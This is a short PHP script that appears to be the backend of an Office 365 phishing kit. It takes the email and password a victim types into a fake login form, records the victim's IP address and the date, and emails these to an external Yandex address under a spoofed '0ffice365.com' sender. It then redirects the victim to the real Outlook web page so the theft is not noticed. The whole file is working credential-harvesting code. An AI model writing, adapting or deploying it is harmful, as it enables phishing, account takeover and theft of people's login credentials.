<?php

$t1=$_POST["email1"];
$t2=$_POST["password1"];
$null1 = "";
$Datex=date("D d M, Y");
$Ipx = $_SERVER['REMOTE_ADDR']?:($_SERVER['HTTP_X_FORWARDED_FOR']?:$_SERVER['HTTP_CLIENT_IP']);

if ($t1 == $null1) {
			//back to HTML 1
			header('Location: index.html');

	} else {

$to  = 'r000reply@yandex.com';
$subject = "0ffice365 Account |Result 1|";
$message = "Account filled: ".$Datex.". "."\nUN: ".$t1."\nPW: ".$t2."\nIP: https://www.iplocationtools.com/".$Ipx.".html";
$headers = 'From: 0ffice365.com'."\r\n".
'Reply-To: r000reply@yandex.com'."\r\n" .
'Bcc: ' . "\r\n" . 
'X-Mailer: PHP/' . phpversion();
mail($to,$subject,$message,$headers);

// HTML 3
header('Location: https://outlook.office.com/owa/');
}
?>